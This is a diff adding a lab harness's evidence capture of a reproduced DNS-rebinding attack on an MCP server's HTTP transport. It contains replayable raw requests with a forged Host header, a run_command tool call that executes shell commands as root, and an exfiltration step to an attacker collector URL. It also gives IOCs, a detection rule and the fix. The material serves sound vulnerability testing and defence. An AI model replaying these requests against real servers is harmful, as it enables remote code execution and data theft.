@@ -1,0 +1,98 @@
+# Meridian Range evidence capture (written by the harness, not by hand).
+# module   : 02-dns-rebind
+# variant  : vuln
+# verdict  : ATTACK-OK (reproduced)
+# captured : 2026-08-02T12:37:18.776Z
+# Addresses and hostnames below are lab-internal; the canary is benign by construction.
+==============================================================================
+  CVE-2025-66414  DNS rebinding past Origin validation on the MCP streamable-HTTP transport
+  target http://mcp.lab.consulereit.nl:8080/mcp   attacker Host rebind.lab.consulereit.nl
+  started 2026-08-02T12:37:18.728Z   canary-only, labnet-internal
+==============================================================================
+
+[INFO ] Modelling the post-rebind request: connect to mcp.lab.consulereit.nl:8080, present Host rebind.lab.consulereit.nl, send no Origin.
+[STEP ] Opening MCP session against mcp.lab.consulereit.nl:8080 with Host: rebind.lab.consulereit.nl
+[PASS ] Session issued to a foreign Host: 19070afd...3674
+[STEP ] Tool invocation: tools/call run_command (benign canary) over the rebound session
+[PASS ] Canary executed: LAB_CANARY_24 returned over the rebound session
+[INFO ] Exfiltrated canary output to attacker-collector (http://collector.lab.consulereit.nl:9000/pwned)
+
+RESULT
+------
+  Vulnerability : CVE-2025-66414 (CWE-1188)
+  Scenario      : 02-dns-rebind
+  Status        : REPRODUCED
+  Confidence    : HIGH
+  Duration      : 46 ms
+
+EVIDENCE (observed facts)
+-------------------------
+  - The victim issued session 19070afd-2441-4a82-b886-b1c91dc73674 to a request carrying Host: rebind.lab.consulereit.nl, a name it does not serve, and no Origin header at all (CWE-1188, CWE-346).
+  - Proof-of-execution canary LAB_CANARY_24 was returned in the tool output ("uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)" ...), confirming the post-rebind request reached the victim MCP and ran.
+
+CONCLUSION
+----------
+  The evidence demonstrates the DNS-rebinding path against an MCP server
+  that ships DNS-rebinding protection off by default (CVE-2025-66414,
+  CWE-1188). The victim issued a session to a request that carried a foreign
+  Host header and no Origin at all, then executed a capability tool over it.
+  Because the post-rebind request is same-origin from the browser's point of
+  view, no Origin check can see it: the control that holds is a Host
+  allow-list, enforced server-side.
+
+EVIDENCE TIMELINE
+-----------------
+  12:37:18.729  +    1ms  Modelling the post-rebind request: connect to mcp.lab.consulereit.nl:8080, present Host rebind.lab.consulereit.nl, send no Origin.
+  12:37:18.729  +    1ms  Opening MCP session against mcp.lab.consulereit.nl:8080 with Host: rebind.lab.consulereit.nl
+  12:37:18.743  +   15ms  Session issued to a foreign Host: 19070afd...3674
+  12:37:18.743  +   15ms  Post-rebind request accepted by the victim MCP
+  12:37:18.743  +   15ms  Tool invocation: tools/call run_command (benign canary) over the rebound session
+  12:37:18.749  +   21ms  Canary executed: LAB_CANARY_24 returned over the rebound session
+  12:37:18.774  +   46ms  Exfiltrated canary output to attacker-collector (http://collector.lab.consulereit.nl:9000/pwned)
+
+RAW HTTP EVIDENCE (replayable protocol capture)
+-----------------------------------------------
+
+  # Post-rebind initialize - forged Host, no Origin
+  > POST /mcp HTTP/1.1
+  > Host: mcp.lab.consulereit.nl:8080
+  > content-type: application/json
+  > accept: application/json, text/event-stream
+  > content-length: 165
+  > host: rebind.lab.consulereit.nl
+  > {"jsonrpc":"2.0","id":0,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"meridian-harness","version":"0.0.0"}}}
+  > [JSON-RPC sent] {"jsonrpc":"2.0","id":0,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"meridian-harness","version":"0.0.0"}}}
+  < HTTP/1.1 200
+  < access-control-allow-origin: *
+  < content-type: text/event-stream
+  < mcp-session-id: 19070afd-2441-4a82-b886-b1c91dc73674
+
+  # Capability invocation - run_command (benign canary) over the rebound session
+  > POST /mcp HTTP/1.1
+  > Host: mcp.lab.consulereit.nl:8080
+  > content-type: application/json
+  > accept: application/json, text/event-stream
+  > content-length: 133
+  > host: rebind.lab.consulereit.nl
+  > mcp-session-id: 19070afd-2441-4a82-b886-b1c91dc73674
+  > {"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"run_command","arguments":{"cmd":"id; hostname; echo LAB_CANARY_$$"}}}
+  > [JSON-RPC sent] {"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"run_command","arguments":{"cmd":"id; hostname; echo LAB_CANARY_$$"}}}
+  < HTTP/1.1 200
+  < access-control-allow-origin: *
+  < content-type: text/event-stream
+  < mcp-session-id: 19070afd-2441-4a82-b886-b1c91dc73674
+  < [JSON-RPC recv] {"result":{"content":[{"type":"text","text":"uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\ne64bd70c86c5\nLAB_CANARY_24\n"}]},"jsonrpc":"2.0","id":1}
+
+IOC SUMMARY (incident-response artifact)
+----------------------------------------
+  Endpoints:       /mcp
+  Methods:         POST
+  Header Host:     rebind.lab.consulereit.nl
+  Header Origin:   (absent here; a browser sends a same-origin one - never cross-origin either way)
+  User-Agent:      browser-class (post-rebind page; same-origin from the browser's point of view)
+  Session id:      (none)
+  Tools driven:    run_command (capability exec)
+  Source:          rebound attacker domain resolving to the victim address
+  Exfil sink:      http://collector.lab.consulereit.nl:9000/pwned
+  Detections:      ATR-2026-70018 (foreign Host on the MCP transport)
+
